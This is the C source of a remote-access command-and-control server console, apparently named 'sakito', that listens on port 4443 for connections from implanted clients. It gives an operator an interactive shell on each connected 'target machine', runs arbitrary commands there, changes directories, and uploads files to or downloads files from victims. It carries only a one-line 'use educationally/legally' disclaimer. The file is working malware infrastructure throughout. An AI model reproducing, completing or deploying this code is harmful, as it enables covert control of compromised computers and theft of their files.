/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <stdio.h> 
#include <netdb.h>
#include <stdlib.h> 
#include <unistd.h>
#include <string.h> 
#include <arpa/inet.h> 
#include <pthread.h>
#include <stdint.h>
#include "sakito_core.h"
#include "sakito_server_tools.h"

#define PORT 4443
#define MEM_CHUNK 5

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;

void terminate_server(int listen_socket, const char* const error) {
	close(listen_socket);
	int err_code = 0;
	if (error) {
		err_code = 1;
		perror(error);
	}

	exit(err_code);
}
 
// Function to create socket.
int create_socket() {
	// Create the server socket object.
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) {
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}
 
// Function to bind socket to specified port.
void bind_socket(int listen_socket) {
	// Create sockaddr_in structure.
	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET; 
	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
	serv_addr.sin_port = htons(PORT); 

	// Bind ip address and port to listen_socket
	if (bind(listen_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) 
		terminate_server(listen_socket, "Socket bind failed.\n");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "Placing socket into listening state failed.\n");
}

void add_client(Conn_map* conns, char* const host, int client_socket) {
	// If delete_client() is executing: wait for it to finish modifying conns->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	if (conns->size == conns->alloc)
		conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

	// When THRD_FLAG evaluates to 0: execution has ended.
	while (conns->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);

	// Set race condition flag to communicate with delete_client().
	conns->THRD_FLAG = 1;

	// Add hostname string and client_socket file descriptor to conns->clients structure.
	conns->clients[conns->size].host = host;
	conns->clients[conns->size].sock = client_socket;
	conns->size++;

	// Unlock/release mutex..
	pthread_mutex_unlock(&lock);

	// Execution is finished so allow delete_client() to continue.
	conns->THRD_FLAG = 0;
}
 
// Thread to recursively accept connections.
void* accept_conns(void* param) {
	// Assign member values to connection map object/structure.
	Conn_map* conns = param;
	conns->alloc = MEM_CHUNK;
	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));
	conns->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(conns->listen_socket);
 
	while (1) {
		// Wait for a connection.
		struct sockaddr_in client;
		int client_sz = sizeof(client);
 
		// Client socket object.
		int client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &client_sz); 
		if (client_socket < 0)
			terminate_server(conns->listen_socket, "Error accepting client connection.\n");

		// Client's remote name and client's ingress port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (getnameinfo((struct sockaddr*)&client, client_sz, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// Add client oriented data to conns object.
		add_client(conns, host, client_socket);
	}
}

// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, int client_socket) {
	// Open file.
	FILE* fd = fopen(buf+8, "rb");
	int32_t bytes = 0, f_size = 0;
 
	// If the file exists:
	if (!fd) {
		puts("File not found.\n");
		return FILE_NOT_FOUND;
	}

	// '3' is the command code for uploading a file via the client.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (write(client_socket, buf+7, cmd_len) < 1)
		return -1;

	// Calculate file size and serialize the file size integer.
	fseek(fd, 0L, SEEK_END);
	f_size = ftell(fd);
	bytes = htonl(f_size);
	fseek(fd, 0L, SEEK_SET);
 
	// Send the serialized file size bytes.
	if (write(client_socket, (char*)&bytes, sizeof(bytes)) < 1)
		return -1;
 
	// Initialize i_result as true.
	int i_result = 1;
 
	if (f_size) {
		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		int bytes_read;
		while (!feof(fd) && i_result > 0) {
			if (bytes_read = fread(buf, 1, BUFLEN, fd))
				// Send file's bytes chunk to remote server.
				i_result = write(client_socket, buf, bytes_read);
			else
				break;
		}
		// Close the file.
		fclose(fd);
	}
 
	return i_result;
}
 
// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
	// '4' is the command code for downloading a file via the client.
	buf[9] = '4';
	
	// Send command code + filename to be parsed.
	if (write(client_socket, buf+9, cmd_len) < 1)
		return -1;
 
	// Open the file.
	FILE* fd = fopen(buf+10, "wb");
 
	// Receive serialized file size int32_t bytes.
	if (read(client_socket, buf, sizeof(int32_t)) < 1)
		return -1;
 
	// Deserialize file size bytes.
	int32_t f_size = ntohl_conv(&*(buf));
	int i_result = 1;

	if (f_size > 0) {
		// Varaible to keep track of downloaded data.
		int32_t total = 0;
	 
		// Receive all file bytes/chunks and write to file until total == file size.
		while (total != f_size && i_result > 0) {
			i_result = read(client_socket, buf, BUFLEN);

			// Write bytes to file.
			fwrite(buf, 1, i_result, fd);
			total += i_result;
		}
	}
	else if (f_size == -1) {
		puts("The client's system cannot find the file specified.\n");
	}
 
	// Close the file.
	fclose(fd);
 
	return i_result;
}
 
// Function send change directory command to client.
int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (write(client_socket, buf+3, cmd_len) < 1)
		return -1;
 
	return 1;
}
 
// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, int client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	write(client_socket, "2", cmd_len);
 
	return 0;
}

int detect_eos(int i_result, char* const buf) {
	if (buf[0] == '\x11' && buf[1] == '\x13' && buf[2] == '\xcf')
		return 1;

	return 0;
}

// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
	// Send command to server.
	if (write(client_socket, buf, cmd_len) < 1)
		return -1;

	// Initialize i_result to true.
	int i_result = 1;

	// Receive command output stream and write output chunks to stdout.
	do {
		i_result = read(client_socket, buf, BUFLEN);
		if (detect_eos(i_result, buf))
			break;
		fwrite(buf, 1, i_result, stdout);
	} while (i_result > 0);

	// write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return i_result;
}

// Function to return function pointer based on parsed command.
const func parse_cmd(char* const buf) {
	// Array of command strings to parse stdin with.
	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	// Function pointer array of each c2 command.
	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file};

	// Parse stdin string and return its corresponding function pointer.
	for (int i = 0; i < 4; i++)
		if (compare(buf, commands[i]))
			return func_array[i];

	// If no command was parsed: send/execute the command string on the client via _popen().
	return &send_cmd;
}

// Function to resize conns array/remove and close connection.
void delete_client(Conn_map* conns, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying conns->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	// Wait for accept_conns() to finish modifying conns->clients.
	while (conns->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);	

	// Set our thread flag to prevent a race condition from occurring with accept_conns().
	conns->THRD_FLAG = 1;

	// If the file descriptor is open: close it.
	if (conns->clients[client_id].sock)
		close(conns->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure's member values.
	if (conns->size > 1) {
		int max_index = conns->size-1;
		for (size_t i = client_id; i < max_index; i++) {
			conns->clients[i].sock = conns->clients[i + 1].sock;
			conns->clients[i].host = conns->clients[i + 1].host;
		}
		conns->clients[max_index].sock = 0;
		conns->clients[max_index].host = NULL;
	}

	conns->size--;

	// Unlock/release our mutex.
	pthread_mutex_unlock(&lock);

	// Allow accept_conns() to continue.
	conns->THRD_FLAG = 0;
}

// Function to parse interactive input and send to specified client.
void interact(Conn_map* conns, char* const buf, const int client_id) {
	int client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;
 
	// Set i_result to true.
	int i_result = 1;
 
	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		printf("%s // ", client_host);
	
		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);
 		buf[0] = '0';
		size_t cmd_len = get_line(buf+1) + 1;
		char* cmd = buf+1;

		if (cmd_len > 1) {
			if (compare(cmd, "background")) {
				return;
			}
			else {
				// Parse and execute command function.
				const func target_func = parse_cmd(cmd);
				i_result = target_func(buf, cmd_len, client_socket);
			}
		}
	}
 
	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(conns, client_id);
	printf("Client: \"%s\" disconnected.\n\n", client_host);
}

void terminate_console(Conn_map *conns, pthread_t acp_thread) {
	// Quit accepting connections.
	pthread_cancel(acp_thread);
	// if there's any connections close them before exiting.
	if (conns->size) {
		for (size_t i = 0; i < conns->size; i++)
			close(conns->clients[i].sock);
		// Free allocated memory.
		free(conns->clients);
	}

	terminate_server(conns->listen_socket, NULL);
}

void validate_id(char* const buf, Conn_map conns) {
	int client_id;
	client_id = atoi(buf+9);
	if (!conns.size || client_id < 0 || client_id > conns.size - 1)
		printf("Invalid client identifier.\n");
	else
		interact(&conns, buf, client_id);
}

// Function to execute command.
void exec_cmd(char* const buf) {
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do {
		rb = fread(buf, 1, BUFLEN, fpipe);
		fwrite(buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Write single newline character to stdout for cmd line output alignment.
	fputc('\n', stdout);
 
	// Close the pipe.
	pclose(fpipe);
}
 
// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	// Instantiate a Conn_map structure.
	Conn_map conns;

	// Set out race condition flag to false.
	conns.THRD_FLAG = 0;

	// Create our pthread object.
	pthread_t acp_thread;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&acp_thread, NULL, accept_conns, &conns);
 
	// Saktio console loop. 
	while (1) {
		printf("sak1to-console // ");
		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };
		size_t cmd_len = get_line(buf);
 
		if (cmd_len > 1)
			if (compare(buf, "exit"))
				// Terminate sakito-console & server.
				terminate_console(&conns, acp_thread);
			else if (compare(buf, "cd "))
				// List all connections.
				chdir(buf+3);
			else if (compare(buf, "list"))
				// List all connections.
				list_connections(&conns);
			else if (compare(buf, "interact "))
				// If ID is valid interact with client.
				validate_id(buf, conns);
			else
				// Execute command on host system.
				exec_cmd(buf);
	}

	return -1;
}
